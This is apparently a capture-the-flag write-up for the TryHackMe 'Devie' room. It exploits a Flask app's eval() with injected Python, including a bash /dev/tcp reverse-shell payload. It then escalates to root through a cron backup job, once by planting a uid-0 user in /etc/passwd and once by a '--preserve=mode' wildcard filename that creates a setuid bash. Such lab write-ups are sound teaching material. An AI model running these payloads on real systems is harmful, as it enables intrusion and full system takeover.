---
title: THM Devie
author: hanhctf
date: 2023-04-04 22:22:22 +0700
categories: [Write-up, THM]
tags: [eval(), python, code review]
toc: true
mermaid: true
---

# [**_Devie room_**](https://tryhackme.com/room/devie)


## Nmap 
With rustscan we can see 2 ports are open
```shell
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
5000/tcp open  upnp?   syn-ack
```

## Code review
In port 5000 is Flask application and we can get the source code to review.  
in app.py
```python
@app.route("/")
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)
```

Function __bisect()__ use __eval()__ function that can be used to achieve authentication bypass and even code injection.

And it's validation on the inputs (in **bisection.py**) just checks they are string fields.
```python
from wtforms import Form, StringField, validators

class InputForm3(Form):
    xa = StringField(default=1,validators=[validators.InputRequired()])
    xb = StringField(default=1,validators=[validators.InputRequired()])
```

==> This can be exploited to run command via passing in a command like
```shell
__import__('os').system('id;whoami')#
```

But we get Code 500 Internal Server Error
![](/commons/THM/Devie/command_inject.png)
![](/commons/THM/Devie/500_internal_server_error.png)


So we run app on local and check.  
In terminal, on dir of source code
```shell
python3 app.py
```
![](/commons/THM/Devie/run_app_on_local.png)


When run code inject on browser ==> Code executed on the backend
![](/commons/THM/Devie/code_excution_on_backend.png)

==> We can get reverse shell with:  
```python
__import__('os').system('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"')#
```

![](/commons/THM/Devie/got_reverse_shell.png)

```shell
bruce@devie:~$ id;whoami
id;whoami
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
bruce
bruce@devie:~$ 
```
**Got flag1.txt**

## Privilege escalation from _bruce_ --> __gordon__
 
We found file "note" in home dir of bruce
```
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
```

Password of __Gordon__ encrypt with this flow  
**password** _XOR_ ==> **encrypted** _base64_ ==> **super secure string**
```shell
bruce@devie:~$ sudo -l
sudo -l
Matching Defaults entries for bruce on devie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on devie:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```
```shell
bruce@devie:~$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: password
AxQDFgUcFwc=
bruce@devie:~$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
EhQRBBMSBAITBBUKBBgZDhMZDhMSFBEEExIEAhMEFQoEGBkOExkOExI=
```

With cyberchef, we can easy find the **secret_key** ==> Password of Gordon
![](/commons/THM/Devie/secret_key.png)
![](/commons/THM/Devie/passwd_Gordon.png)

**Got flag2.txt** 

## Privilege escalation from _gordon_ --> **root**
Use __pspy__, we can see a cronjob
```shell
2023/04/03 09:38:01 CMD: UID=0    PID=24540  | /usr/sbin/CRON -f 
2023/04/03 09:38:01 CMD: UID=0    PID=24542  | /usr/bin/bash /usr/bin/backup 
2023/04/03 09:38:01 CMD: UID=0    PID=24541  | /bin/sh -c /usr/bin/bash /usr/bin/backup 
2023/04/03 09:38:01 CMD: UID=0    PID=24543  | cp report1 report2 report3 /home/gordon/backups/
2023/04/03 09:39:01 CMD: UID=0    PID=24544  | /usr/sbin/CRON -f 
2023/04/03 09:39:01 CMD: UID=0    PID=24546  | /usr/bin/bash /usr/bin/backup 
2023/04/03 09:39:01 CMD: UID=0    PID=24545  | /bin/sh -c /usr/bin/bash /usr/bin/backup 
2023/04/03 09:39:01 CMD: UID=0    PID=24547  | cp report1 report2 report3 /home/gordon/backups/
```

```shell
gordon@devie:~$ cat /usr/bin/backup 
cat /usr/bin/backup
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/

```

### View source code of backup app, we can use 2 methods to get **root**
#### ***Method 1*** use symbolic link

1. copy /etc/passwd →  /home/gordon/reports
2. add a user have a root permission    

```shell
mkpasswd -m sha512crypt
Password: password
$6$eEZqqrBwHGHO/Xun$TcuLtBIraRYkI8gHx4uhV.zyiGapYMZzT02PI4STnSNM8HjNzutZg/vkkbf70I3kpIzaLn9QlPXsnLvTiXRDM.                                                                                                                                                          
echo "hanhctf:\$6\$eEZqqrBwHGHO/Xun\$TcuLtBIraRYkI8gHx4uhV.zyiGapYMZzT02PI4STnSNM8HjNzutZg/vkkbf70I3kpIzaLn9QlPXsnLvTiXRDM.:0:0:hanhctf:/hanhctf:/bin/bash" >> ~/home/gordon/reports/passwd
```   

3. remove backups folder in /home/gordon/
4. Create a symbolic link ln -s /etc /home/gordon/backups ⇒ system will auto replace passwd in /home/gordon that added new root user to /etc    

```shell
gordon@devie:~$ su hanhctf
su hanhctf
Password: password
root@devie:/home/gordon# id;whoami
id;whoami
uid=0(root) gid=0(root) groups=0(root)
root
root@devie:/home/gordon#
```   

#### ***Method 2*** use wildcard --preserve=mode of **cp**
In  

```shell
cp * /home/gordon/backups/
```   

1. If we just use the regular cp command, the ownership and timestamp change, but we don't keep the same permissions.
2. The *--preserve=mode* allows to maintain the permissions of a file when copying over.   

```shell
gordon@devie:~/reports$ cp /bin/bash ./bash && chmod u+s ./bash && echo "" > "--preserve=mode" 
< && chmod u+s ./bash && echo "" > "--preserve=mode"
gordon@devie:~/reports$ ls -la
ls -la
total 1180
drwxrwx--- 2 gordon gordon    4096 Apr  4 01:23  .
drwxr-xr-x 4 gordon gordon    4096 Apr  4 01:21  ..
-rwsr-xr-x 1 gordon gordon 1183448 Apr  4 01:23  bash
-rw-rw-r-- 1 gordon gordon       1 Apr  4 01:23 '--preserve=mode'
-rw-r--r-- 1    640 gordon      57 Feb 19 23:31  report1
-rw-r--r-- 1    640 gordon      72 Feb 19 23:32  report2
-rw-r--r-- 1    640 gordon     100 Feb 19 23:33  report3
gordon@devie:~/reports$ cd ../backups
cd ../backups
gordon@devie:~/backups$ ls -la
ls -la
total 1180
drwxrwx--- 2 gordon gordon    4096 Apr  4 01:24 .
drwxr-xr-x 4 gordon gordon    4096 Apr  4 01:21 ..
-rwsr-xr-x 1 root   root   1183448 Apr  4 01:30 bash
-rw-r--r-- 1 root   root      2090 Apr  4 01:22 passwd
-rw-r--r-- 1 root   root        57 Apr  4 01:30 report1
-rw-r--r-- 1 root   root        72 Apr  4 01:30 report2
-rw-r--r-- 1 root   root       100 Apr  4 01:30 report3
gordon@devie:~/backups$ ./bash -p
./bash -p
bash-5.0# id;whoami
id;whoami
uid=1001(gordon) gid=1001(gordon) euid=0(root) groups=1001(gordon)
root
bash-5.0# 
```

**Got root.txt** 
